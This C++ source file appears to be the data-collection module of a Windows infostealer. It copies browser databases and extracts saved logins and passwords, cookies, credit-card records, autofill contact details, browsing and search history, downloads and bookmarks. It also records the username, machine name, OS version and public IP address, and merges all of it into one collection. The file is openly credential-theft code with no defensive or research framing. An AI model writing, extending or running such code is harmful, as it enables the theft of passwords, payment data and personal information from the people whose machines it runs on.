#include "DataRetriever.h"

#include <winsock2.h>
#include <windows.h>
#include <Lmcons.h>
#include <shlobj.h>
#include <fstream>
#include <filesystem>
#include <sstream>
#include <format>
#include <stdexcept>
#include <vector>
#include <unordered_set>
#include <unordered_map>
#include <memory>

#include "sqlite3.h"
#include "json.hpp"
#include "Utilities.h"

namespace fs = std::filesystem;
using nlohmann::json;

DatabaseRetriever::DatabaseRetriever(const BrowserInfo& browser, const std::wstring& dbPath, const std::wstring& dataType)
    : browserInfo(browser), dbPath(dbPath), dataType(dataType) {
}

std::wstring DatabaseRetriever::retrieveData() {
    if (dbPath.empty() || !fs::exists(dbPath)) {
        return L"";
    }

    std::wstring sqlResult = L"--- " + browserInfo.name + L" " + dataType + L" ---\n";

    std::wstring tempDbPath = copyDatabaseToTemp(dbPath);
    if (tempDbPath.empty()) {
        return L"";
    }

    sqlite3* db = nullptr;
    if (sqlite3_open_v2(wstringToString(tempDbPath).c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
        DeleteFileW(tempDbPath.c_str());
        return L"";
    }

    std::string sql = getSQL();
    if (sql.empty()) {
        sqlite3_close(db);
        DeleteFileW(tempDbPath.c_str());
        return L"";
    }

    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
        sqlite3_close(db);
        DeleteFileW(tempDbPath.c_str());
        return L"";
    }

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::wstring rowData = processRows(stmt);
        if (!rowData.empty()) {
            sqlResult += rowData;
        }
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileW(tempDbPath.c_str());

    sqlResult += L"\n";
    return sqlResult;
}

std::wstring DatabaseRetriever::copyDatabaseToTemp(const std::wstring& dbPath) const {
    wchar_t tempPathBuffer[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPathBuffer) == 0) {
        return L"";
    }

    wchar_t tempFileName[MAX_PATH];
    if (GetTempFileNameW(tempPathBuffer, L"db", 0, tempFileName) == 0) {
        return L"";
    }

    if (!CopyFileW(dbPath.c_str(), tempFileName, FALSE)) {
        return L"";
    }

    return std::wstring(tempFileName);
}

BrowserHistoryRetriever::BrowserHistoryRetriever(const BrowserInfo& browser)
    : DatabaseRetriever(browser, browser.historyPath, L"History") {
}

std::string BrowserHistoryRetriever::getSQL() const {
    return "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100;";
}

std::wstring BrowserHistoryRetriever::processRows(sqlite3_stmt* stmt) const {
    const unsigned char* url = sqlite3_column_text(stmt, 0);
    const unsigned char* title = sqlite3_column_text(stmt, 1);
    int visit_count = sqlite3_column_int(stmt, 2);
    long long last_visit_time = sqlite3_column_int64(stmt, 3);

    std::wstring readableTime = ::webkitTimestampToWString(last_visit_time);
    return std::format(L"URL: {}\nTitle: {}\nVisit Count: {}\nLast Visit Time: {}\n\n",
        stringToWString(reinterpret_cast<const char*>(url)),
        stringToWString(reinterpret_cast<const char*>(title)),
        visit_count, readableTime);
}

BrowserPasswordsRetriever::BrowserPasswordsRetriever(const BrowserInfo& browser)
    : DatabaseRetriever(browser, browser.passwordsPath, L"Passwords") {
}

std::string BrowserPasswordsRetriever::getSQL() const {
    return "SELECT origin_url, username_value, password_value FROM logins;";
}

std::wstring BrowserPasswordsRetriever::processRows(sqlite3_stmt* stmt) const {
    const unsigned char* origin_url = sqlite3_column_text(stmt, 0);
    const unsigned char* username = sqlite3_column_text(stmt, 1);
    const unsigned char* password = sqlite3_column_text(stmt, 2);

    return std::format(L"Origin URL: {}\nUsername: {}\nPassword: {}\n\n",
        stringToWString(reinterpret_cast<const char*>(origin_url)),
        stringToWString(reinterpret_cast<const char*>(username)),
        stringToWString(reinterpret_cast<const char*>(password)));
}

BrowserCookiesRetriever::BrowserCookiesRetriever(const BrowserInfo& browser)
    : DatabaseRetriever(browser, browser.cookiesPath, L"Cookies") {
}

std::string BrowserCookiesRetriever::getSQL() const {
    return "SELECT host_key, name, encrypted_value, expires_utc FROM cookies;";
}

std::wstring BrowserCookiesRetriever::processRows(sqlite3_stmt* stmt) const {
    const unsigned char* host_key = sqlite3_column_text(stmt, 0);
    const unsigned char* name = sqlite3_column_text(stmt, 1);
    const unsigned char* encrypted_value = sqlite3_column_text(stmt, 2);
    long long expires_utc = sqlite3_column_int64(stmt, 3);

    std::wstring readableTime = ::webkitTimestampToWString(expires_utc);

    return std::format(L"Host: {}\nName: {}\nEncrypted Value: {}\nExpires UTC: {}\n\n",
        stringToWString(reinterpret_cast<const char*>(host_key)),
        stringToWString(reinterpret_cast<const char*>(name)),
        stringToWString(reinterpret_cast<const char*>(encrypted_value)),
        readableTime);
}

BrowserCreditCardsRetriever::BrowserCreditCardsRetriever(const BrowserInfo& browser)
    : DatabaseRetriever(browser, browser.creditCardsPath, L"Credit Cards") {
}

std::string BrowserCreditCardsRetriever::getSQL() const {
    return "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards;";
}

std::wstring BrowserCreditCardsRetriever::processRows(sqlite3_stmt* stmt) const {
    const unsigned char* name_on_card = sqlite3_column_text(stmt, 0);
    int expiration_month = sqlite3_column_int(stmt, 1);
    int expiration_year = sqlite3_column_int(stmt, 2);
    const unsigned char* card_number_encrypted = sqlite3_column_text(stmt, 3);

    return std::format(L"Name on Card: {}\nExpiration: {}/{}\nEncrypted Card Number: {}\n\n",
        stringToWString(reinterpret_cast<const char*>(name_on_card)),
        expiration_month, expiration_year,
        stringToWString(reinterpret_cast<const char*>(card_number_encrypted)));
}

BrowserAutofillRetriever::BrowserAutofillRetriever(const BrowserInfo& browser)
    : DatabaseRetriever(browser, browser.autofillPath, L"Autofill") {
}

std::string BrowserAutofillRetriever::getSQL() const {
    return "SELECT name, value, date_created, date_last_used FROM autofill WHERE name IN ('email', 'phone', 'street_address', 'city', 'state', 'zipcode') ORDER BY date_last_used DESC;";
}

std::wstring BrowserAutofillRetriever::processRows(sqlite3_stmt* stmt) const {
    const unsigned char* name = sqlite3_column_text(stmt, 0);
    const unsigned char* value = sqlite3_column_text(stmt, 1);
    long long date_created = sqlite3_column_int64(stmt, 2);
    long long date_last_used = sqlite3_column_int64(stmt, 3);

    std::wstring readableCreated = ::webkitTimestampToWString(date_created);
    std::wstring readableLastUsed = ::webkitTimestampToWString(date_last_used);

    return std::format(L"Name: {}\nValue: {}\nDate Created: {}\nDate Last Used: {}\n\n",
        stringToWString(reinterpret_cast<const char*>(name)),
        stringToWString(reinterpret_cast<const char*>(value)),
        readableCreated,
        readableLastUsed);
}

BrowserSearchHistoryRetriever::BrowserSearchHistoryRetriever(const BrowserInfo& browser)
    : DatabaseRetriever(browser, browser.searchQueriesPath.empty() ? browser.historyPath : browser.searchQueriesPath, L"SearchHistory") {
}

std::string BrowserSearchHistoryRetriever::getSQL() const {
    return "SELECT term FROM keyword_search_terms ORDER BY id DESC;";
}

std::wstring BrowserSearchHistoryRetriever::processRows(sqlite3_stmt* stmt) const {
    const unsigned char* term = sqlite3_column_text(stmt, 0);

    return std::format(L"Term: {}\n\n",
        stringToWString(reinterpret_cast<const char*>(term)));
}

BrowserDownloadHistoryRetriever::BrowserDownloadHistoryRetriever(const BrowserInfo& browser)
    : DatabaseRetriever(browser, browser.downloadsPath.empty() ? browser.historyPath : browser.downloadsPath, L"Downloads") {
}

std::string BrowserDownloadHistoryRetriever::getSQL() const {
    return "SELECT id, "
        "(SELECT url FROM downloads_url_chains WHERE downloads_url_chains.id = downloads.id LIMIT 1) AS origin_url, "
        "target_path AS final_path, "
        "start_time, "
        "CASE WHEN received_bytes > 0 THEN 1 ELSE 0 END AS download_status "
        "FROM downloads "
        "ORDER BY start_time DESC;";
}

std::wstring BrowserDownloadHistoryRetriever::processRows(sqlite3_stmt* stmt) const {
    int id = sqlite3_column_int(stmt, 0);
    const unsigned char* origin_url = sqlite3_column_text(stmt, 1);
    const unsigned char* target_path = sqlite3_column_text(stmt, 2);
    long long start_time = sqlite3_column_int64(stmt, 3);
    bool download_status = sqlite3_column_int(stmt, 4) != 0;
    
    std::wstring readableTime = ::webkitTimestampToWString(start_time);
    return std::format(L"ID: {}\nOrigin URL: {}\nFinal Path: {}\nStart Time: {}\nDownload Status: {}\n\n",
        id,
        stringToWString(reinterpret_cast<const char*>(origin_url)),
        stringToWString(reinterpret_cast<const char*>(target_path)),
        readableTime,
        download_status ? L"Completed" : L"Incomplete");
}

FileRetriever::FileRetriever(const BrowserInfo& browser)
    : browserInfo(browser) {
}

std::wstring FileRetriever::copyFileToTemp(const std::wstring& filePath) const {
    wchar_t tempPathBuffer[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPathBuffer) == 0) {
        return L"";
    }

    wchar_t tempFileName[MAX_PATH];
    if (GetTempFileNameW(tempPathBuffer, L"file", 0, tempFileName) == 0) {
        return L"";
    }

    if (!CopyFileW(filePath.c_str(), tempFileName, FALSE)) {
        return L"";
    }

    return std::wstring(tempFileName);
}

BrowserBookmarksRetriever::BrowserBookmarksRetriever(const BrowserInfo& browser)
    : FileRetriever(browser) {
}

std::wstring BrowserBookmarksRetriever::retrieveData() {
    if (browserInfo.bookmarksPath.empty() || !fs::exists(browserInfo.bookmarksPath)) {
        return L"";
    }

    try {
        std::wstring tempBookmarksPath = copyFileToTemp(browserInfo.bookmarksPath);
        if (tempBookmarksPath.empty()) {
            return L"";
        }

        std::ifstream bookmarksFile(tempBookmarksPath);
        if (!bookmarksFile) {
            DeleteFileW(tempBookmarksPath.c_str());
            return L"";
        }

        json bookmarksJson;
        bookmarksFile >> bookmarksJson;
        bookmarksFile.close();
        DeleteFileW(tempBookmarksPath.c_str());

        std::wstring info = L"--- " + browserInfo.name + L" Bookmarks ---\n";

        if (bookmarksJson.contains("roots")) {
            auto roots = bookmarksJson["roots"];
            for (auto& [key, value] : roots.items()) {
                extractBookmarks(value, info, stringToWString(key), 1);
            }
        }

        info += L"\n";
        return info;
    }
    catch (...) {
        return L"";
    }
}

void BrowserBookmarksRetriever::extractBookmarks(const nlohmann::json& node, std::wstring& info,
    const std::wstring& folder, int depth) const {
    if (!folder.empty()) {
        std::wstring indentation(depth - 1, L' ');
        info += indentation + folder + L"/\n";
    }

    if (node.contains("children")) {
        for (const auto& child : node["children"]) {
            if (child.contains("type") && child["type"] == "folder") {
                std::wstring folderName = stringToWString(child.value("name", ""));
                extractBookmarks(child, info, folderName, depth + 1);
            }
            else if (child.contains("type") && child["type"] == "url") {
                std::wstring name = stringToWString(child.value("name", ""));
                std::wstring url = stringToWString(child.value("url", ""));

                std::wstring indentation(depth, L' ');
                info += indentation + L"Name: " + name + L"\n";
                info += indentation + L"Link: " + url + L"\n\n";
            }
        }
    }
}

std::wstring WindowsUserRetriever::retrieveData() {
    DWORD sz = UNLEN + 1;
    wchar_t name[UNLEN + 1];
    if (GetUserNameW(name, &sz)) {
        return L"--- Windows User ---\nUsername: " + std::wstring(name) + L"\n\n";
    }
    return L"";
}

std::wstring SystemInfoRetriever::retrieveData() {
    std::wstring info = L"--- System Information ---\n";
    RTL_OSVERSIONINFOW rovi{ sizeof(rovi) };
    auto hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (fxPtr && fxPtr(&rovi) == 0) {
            info += std::format(L"OS Version: {}.{}.{} {}\n",
                rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber, rovi.szCSDVersion);
        }
        else {
            info += L"OS Version: Unknown\n";
        }
    }
    else {
        info += L"OS Version: Unknown\n";
    }

    wchar_t machineName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(machineName) / sizeof(machineName[0]);
    info += GetComputerNameW(machineName, &size)
        ? std::format(L"Machine Name: {}\n", machineName)
        : L"Machine Name: Unknown\n";

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    info += std::format(L"System Architecture: {}\n\n", getSystemArchitecture(si.wProcessorArchitecture));
    return info;
}

std::wstring SystemInfoRetriever::getSystemArchitecture(unsigned short architecture) {
    switch (architecture) {
    case PROCESSOR_ARCHITECTURE_AMD64: return L"x64 (AMD or Intel)";
    case PROCESSOR_ARCHITECTURE_ARM:   return L"ARM";
    case PROCESSOR_ARCHITECTURE_IA64:  return L"Intel Itanium-based";
    case PROCESSOR_ARCHITECTURE_INTEL: return L"x86";
    default:                           return L"Unknown architecture";
    }
}

std::wstring IPAddressRetriever::retrieveData() {
    std::wstring info = L"--- IP Address Information ---\n";
    std::wstring publicIP = getPublicIP();
    if (!publicIP.empty()) {
        info += std::format(L"Public IP Address: {}\n\n", publicIP);
    }
    else {
        info += L"Public IP Address: Unable to retrieve.\n\n";
    }
    return info;
}

std::wstring IPAddressRetriever::getPublicIP() {
    WinHTTPHandle session(WinHttpOpen(L"UserAgent/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0));
    if (!session) {
        return L"";
    }

    WinHTTPHandle connect(WinHttpConnect(session.get(), L"api.ipify.org",
        INTERNET_DEFAULT_HTTP_PORT, 0));
    if (!connect) {
        return L"";
    }

    WinHTTPHandle request(WinHttpOpenRequest(connect.get(),
        L"GET",
        L"/",
        nullptr,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0));
    if (!request) {
        return L"";
    }

    if (!WinHttpSendRequest(request.get(),
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0)) {
        return L"";
    }

    if (!WinHttpReceiveResponse(request.get(), nullptr)) {
        return L"";
    }

    DWORD statusCode = 0;
    DWORD size = sizeof(statusCode);
    if (!WinHttpQueryHeaders(request.get(),
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        nullptr, &statusCode, &size, nullptr)) {
        return L"";
    }

    if (statusCode != 200) {
        return L"";
    }

    std::wstring publicIP;
    DWORD bytesAvailable = 0;
    if (WinHttpQueryDataAvailable(request.get(), &bytesAvailable) && bytesAvailable > 0) {
        std::vector<char> buffer(bytesAvailable + 1, 0);
        DWORD bytesRead = 0;
        if (WinHttpReadData(request.get(), buffer.data(), bytesAvailable, &bytesRead)) {
            publicIP = stringToWString(std::string(buffer.data()));
        }
    }
    return publicIP;
}

void DataCollector::addRetriever(std::unique_ptr<DataRetriever> retriever) {
    retrievers.emplace_back(std::move(retriever));
}

std::unordered_map<std::wstring, std::unordered_map<std::wstring, std::wstring>>
DataCollector::collectData() const {
    std::unordered_map<std::wstring, std::unordered_map<std::wstring, std::wstring>> aggregatedData;
    std::unordered_set<std::wstring> systemHeaders = {
        L"Windows User",
        L"System Information",
        L"IP Address Information"
    };

    std::vector<std::wstring> knownDataTypes = {
        L"Credit Cards",
        L"Autofill",
        L"Bookmarks",
        L"History",
        L"Passwords",
        L"Cookies",
        L"SearchHistory",
        L"Downloads"
    };

    for (const auto& retriever : retrievers) {
        try {
            std::wstring data = retriever->retrieveData();
            if (data.empty()) continue;

            std::wstringstream ss(data);
            std::wstring line;
            std::wstring header;
            std::wstring content;

            while (std::getline(ss, line)) {
                if (line.rfind(L"---", 0) == 0) {
                    if (!header.empty() && !content.empty()) {
                        size_t start = header.find(L"--- ") + 4;
                        size_t end = header.find(L" ---");
                        if (start != std::wstring::npos && end != std::wstring::npos && end > start) {
                            std::wstring fullHeader = header.substr(start, end - start);

                            std::wstring matchedDataType;
                            std::wstring browser;
                            for (const auto& dataType : knownDataTypes) {
                                if (fullHeader.size() >= dataType.size()
                                    && fullHeader.compare(fullHeader.size() - dataType.size(), dataType.size(), dataType) == 0) {
                                    matchedDataType = dataType;
                                    browser = fullHeader.substr(0, fullHeader.size() - dataType.size());
                                    size_t lastNonSpace = browser.find_last_not_of(L" ");
                                    if (lastNonSpace != std::wstring::npos) {
                                        browser = browser.substr(0, lastNonSpace + 1);
                                    }
                                    break;
                                }
                            }

                            if (!matchedDataType.empty() && !browser.empty()) {
                                aggregatedData[browser][matchedDataType] = trim(content);
                            }
                            else {
                                if (systemHeaders.find(fullHeader) != systemHeaders.end()) {
                                    aggregatedData[fullHeader][L"Content"] = trim(content);
                                }
                            }
                        }
                        content.clear();
                    }
                    header = line;
                }
                else {
                    content += line + L"\n";
                }
            }

            if (!header.empty() && !content.empty()) {
                size_t start = header.find(L"--- ") + 4;
                size_t end = header.find(L" ---");
                if (start != std::wstring::npos && end != std::wstring::npos && end > start) {
                    std::wstring fullHeader = header.substr(start, end - start);

                    std::wstring matchedDataType;
                    std::wstring browser;
                    for (const auto& dataType : knownDataTypes) {
                        if (fullHeader.size() >= dataType.size()
                            && fullHeader.compare(fullHeader.size() - dataType.size(), dataType.size(), dataType) == 0) {
                            matchedDataType = dataType;
                            browser = fullHeader.substr(0, fullHeader.size() - dataType.size());
                            size_t lastNonSpace = browser.find_last_not_of(L" ");
                            if (lastNonSpace != std::wstring::npos) {
                                browser = browser.substr(0, lastNonSpace + 1);
                            }
                            break;
                        }
                    }

                    if (!matchedDataType.empty() && !browser.empty()) {
                        aggregatedData[browser][matchedDataType] = trim(content);
                    }
                    else {
                        if (systemHeaders.find(fullHeader) != systemHeaders.end()) {
                            aggregatedData[fullHeader][L"Content"] = trim(content);
                        }
                    }
                }
            }
        } catch (...) { }
    }
    return aggregatedData;
}

void DataCollector::addToAggregatedData(
    std::unordered_map<std::wstring, std::unordered_map<std::wstring, std::wstring>>& aggregatedData,
    const std::wstring& header,
    const std::wstring& content) const {
    size_t start = header.find(L"--- ") + 4;
    size_t end = header.find(L" ---");
    std::wstring fullHeader = header.substr(start, end - start);
    aggregatedData[fullHeader][L"Content"] = content;
}
